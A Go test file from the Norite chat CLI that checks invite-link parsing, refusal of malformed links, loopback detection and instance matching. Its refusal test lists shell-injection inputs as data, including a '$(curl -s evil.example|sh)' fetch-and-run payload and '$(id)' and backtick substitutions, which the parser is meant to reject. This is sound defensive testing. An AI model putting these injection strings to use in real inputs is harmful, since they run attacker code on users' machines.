// SPDX-FileCopyrightText: 2026 Alexandre Duffez
// SPDX-License-Identifier: AGPL-3.0-or-later

package ops_test

import (
	"context"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/Alexnex31/Norite/backend/apicontract"
	"github.com/Alexnex31/Norite/cli/internal/clierr"
	"github.com/Alexnex31/Norite/cli/internal/daemontest"
	"github.com/Alexnex31/Norite/cli/internal/ops"
	"github.com/Alexnex31/Norite/daemon/ipc"
)

func TestALinkReadsBackAsTheInstanceAndTheCode(t *testing.T) {
	for _, instance := range []string{"https://chat.example.com", "http://192.168.1.20:8080", "https://example.com/norite"} {
		link := ops.InviteLink(instance, "PGTQRBXGTCDFFWBH")
		got, err := ops.ParseInvite(link)
		require.NoError(t, err, link)
		assert.Equal(t, ops.Invite{Instance: instance, Code: "PGTQRBXGTCDFFWBH"}, got, link)
	}
	assert.Equal(t, "https://chat.example.com/join#PGTQRBXGTCDFFWBH",
		ops.InviteLink("https://chat.example.com/", "PGTQRBXGTCDFFWBH"))
}

func TestAnInviteIsALinkOrACode(t *testing.T) {
	for raw, want := range map[string]ops.Invite{
		"PGTQRBXGTCDFFWBH":       {Code: "PGTQRBXGTCDFFWBH"},
		"  pgtq-rbxg-tcdf-fwbh ": {Code: "pgtq-rbxg-tcdf-fwbh"},
		"PGTQ RBXG TCDF FWBH":    {Code: "PGTQ RBXG TCDF FWBH"},
		"PGTQ\tRBXG":             {Code: "PGTQ\tRBXG"},
		// As an instance URL is read: a bare host is https.
		"chat.example.com/join#PGTQRBXGTCDFFWBH":   {Instance: "https://chat.example.com", Code: "PGTQRBXGTCDFFWBH"},
		"https://chat.example.com/join/#ABCD-EFGH": {Instance: "https://chat.example.com", Code: "ABCD-EFGH"},
		"HTTPS://Chat.Example.com/join#ABCD":       {Instance: "https://Chat.Example.com", Code: "ABCD"},
		// What an address is written with: a port, an IPv6 literal, a path, a name in another script.
		"http://[fd00::1]:8080/n-o_r.i~te/join#ABCD": {Instance: "http://[fd00::1]:8080/n-o_r.i~te", Code: "ABCD"},
		"https://café.example/join#ABCD":             {Instance: "https://café.example", Code: "ABCD"},
	} {
		got, err := ops.ParseInvite(raw)
		require.NoError(t, err, raw)
		assert.Equal(t, want, got, raw)
	}
}

// Anything a link does not need is refused, not ignored: the link decides where a password goes.
func TestWhatIsNotAnInviteIsRefused(t *testing.T) {
	for _, raw := range []string{
		"",
		"   ",
		"https://chat.example.com/join",  // no code
		"https://chat.example.com/join#", // no code
		"https://chat.example.com/#PGTQRBXGTCDFFWBH",           // not /join
		"https://chat.example.com/joint#PGTQRBXGTCDFFWBH",      // not /join
		"https://chat.example.com/join?x=1#PGTQRBXGTCDFFWBH",   // a query
		"https://chat.example.com/join?#PGTQRBXGTCDFFWBH",      // an empty one
		"https://chat.example.com/a/../join#PGTQRBXGTCDFFWBH",  // a dot segment
		"https://chat.example.com/./join#PGTQRBXGTCDFFWBH",     // a dot segment
		"https://chat.example.com/join#PGTQ/RBXG",              // not a code
		"https://chat.example.com/join#PGTQ\u202eRBXG",         // not a code, and a bidi override
		"https://evil.example#x/join#PGTQRBXGTCDFFWBH",         // the fragment is everything after the first #
		"https://chat.example.com/a%3Fx/join#PGTQRBXGTCDFFWBH", // a query hidden in the path
		"https://chat.example.com/a%23x/join#PGTQRBXGTCDFFWBH", // a fragment hidden in the path
		"https://chat.example.com/a%2Fb/join#PGTQRBXGTCDFFWBH", // any encoding at all
		"https://chat.example.com/it's/join#PGTQRBXGTCDFFWBH",  // a quote, which could not be printed back quoted
		// What a shell reads, in an address printed back unquoted as part of a command to paste.
		"https://chat.example.com/$(curl -s evil.example|sh)/join#PGTQRBXGTCDFFWBH",
		"https://a$(id).example/join#PGTQRBXGTCDFFWBH",
		"https://a;id;.example/join#PGTQRBXGTCDFFWBH",
		"https://chat.example.com/`id`/join#PGTQRBXGTCDFFWBH",
		"https://chat.example.com/a&b/join#PGTQRBXGTCDFFWBH",
		"https://chat.example.com/a b/join#PGTQRBXGTCDFFWBH",
		`https://chat.example.com/a"b/join#PGTQRBXGTCDFFWBH`,
		`https://chat.example.com/a\b/join#PGTQRBXGTCDFFWBH`,
		"PGTQ_RBXG",
		"PGTQRBXGTCDFFWBHPGTQRBXGTCDFFWBHPGTQRBXGTCDFFWBHPGTQRBXGTCDFFWBHX", // past the bound
	} {
		_, err := ops.ParseInvite(raw)
		assert.Error(t, err, "%q", raw)
	}
}

func TestALinkNamingAnUnusableInstanceIsRefused(t *testing.T) {
	for _, raw := range []string{
		"ftp://chat.example.com/join#PGTQRBXGTCDFFWBH",
		"https:///join#PGTQRBXGTCDFFWBH",
		"https://user:pass@chat.example.com/join#PGTQRBXGTCDFFWBH",
		"https://user@chat.example.com/join#PGTQRBXGTCDFFWBH",
		"https://chat\u00a0example.com/join#PGTQRBXGTCDFFWBH",
	} {
		_, err := ops.ParseInvite(raw)
		assert.Error(t, err, "%q", raw)
	}
}

func TestALinkToThisMachineAloneIsToldApart(t *testing.T) {
	for _, local := range []string{
		"http://localhost:8080", "http://LOCALHOST", "http://norite.localhost", "http://127.0.0.1:8080",
		"http://127.1.2.3", "http://[::1]:8080", "http://[::ffff:127.0.0.1]", "http://169.254.10.1",
		"http://[fe80::1]", "http://0.0.0.0:8080", "http://[::]:8080",
	} {
		assert.True(t, ops.LocalOnly(local), local)
	}
	for _, shared := range []string{
		"https://chat.example.com", "http://192.168.1.20:8080", "http://10.0.2.2:8130", "http://[2001:db8::1]",
		"http://localhost.example.com",
	} {
		assert.False(t, ops.LocalOnly(shared), shared)
	}
}

func invitePreview() apicontract.GuildInvitePreview {
	p := apicontract.GuildInvitePreview{Code: "PGTQRBXGTCDFFWBH"}
	p.Guild.Id, p.Guild.Name, p.Channel.Id = "10", "Guild", "20"
	return p
}

// TestACodeIsSentOnlyToTheInstanceItsLinkNames: a link's code goes to the instance the link names, however
// that is written, and a link for another is refused by the daemon with nothing sent, naming both. A bare
// code names none and goes to whichever the daemon is signed in to.
func TestACodeIsSentOnlyToTheInstanceItsLinkNames(t *testing.T) {
	d := daemontest.New(t).On("previewInvite", daemontest.OK(invitePreview())).
		SignInFrom(func() string { return "https://chat.example.com" })
	ctx := context.Background()
	for _, raw := range []string{"https://chat.example.com/join#PGTQRBXGTCDFFWBH",
		"https://Chat.Example.com:443/join#PGTQRBXGTCDFFWBH", " PGTQ-RBXG "} {
		inv, err := ops.ParseInvite(raw)
		require.NoError(t, err, raw)
		_, err = ops.PreviewInvite(ctx, d, inv)
		require.NoError(t, err, raw)
	}
	require.Len(t, d.Requests(), 3)

	inv, err := ops.ParseInvite("https://other.example/join#PGTQRBXGTCDFFWBH")
	require.NoError(t, err)
	for _, send := range []func() error{
		func() error { _, err := ops.PreviewInvite(ctx, d, inv); return err },
		func() error { _, err := ops.JoinInvite(ctx, d, inv); return err },
		func() error { return ops.RevokeInvite(ctx, d, inv) },
	} {
		err := send()
		var usage *clierr.UsageError
		require.ErrorAs(t, err, &usage)
		assert.EqualError(t, err, "that is for https://other.example, and this machine is signed in to "+
			"https://chat.example.com, so nothing was sent")
	}
	assert.Len(t, d.Requests(), 3, "nothing was sent for the link to another instance")
}

// TestALinkWaitsForADaemonStillStarting: the daemon decides whether a link is for its instance, when it is
// about to send the code, so a READY that names no instance yet is no refusal. A client attached while the
// daemon was starting sends the link's code once the daemon has signed in there.
func TestALinkWaitsForADaemonStillStarting(t *testing.T) {
	d := daemontest.New(t).On("previewInvite", daemontest.OK(invitePreview())).
		SignInFrom(func() string { return "https://chat.example.com" })
	c := d.Attach(ipc.Ready{Standing: ipc.StandingStarting, Guilds: []ipc.GuildSummary{}}, false)
	inv, err := ops.ParseInvite("https://chat.example.com/join#PGTQRBXGTCDFFWBH")
	require.NoError(t, err)
	_, err = ops.PreviewInvite(context.Background(), c, inv)
	require.NoError(t, err)
	assert.Len(t, d.Requests(), 1)

	// Signed out, it says so, and the way on is a sign-in, not a moment's wait.
	out := daemontest.New(t).SignInFrom(func() string { return "" })
	_, err = ops.PreviewInvite(context.Background(), out, inv)
	var unavailable *clierr.UnavailableError
	require.ErrorAs(t, err, &unavailable)
	assert.EqualError(t, err, "the daemon is not signed in; run `norite login`")
}

func TestAnInvitePastItsBoundIsRefused(t *testing.T) {
	link := "https://chat.example.com/" + strings.Repeat("a/", 250) + "join#PGTQRBXGTCDFFWBH"
	require.Greater(t, len(link), ops.MaxInvite)
	_, err := ops.ParseInvite(link)
	assert.Error(t, err)
	under := "https://chat.example.com/" + strings.Repeat("a/", 100) + "join#PGTQRBXGTCDFFWBH"
	require.LessOrEqual(t, len(under), ops.MaxInvite)
	_, err = ops.ParseInvite(under)
	assert.NoError(t, err)
}
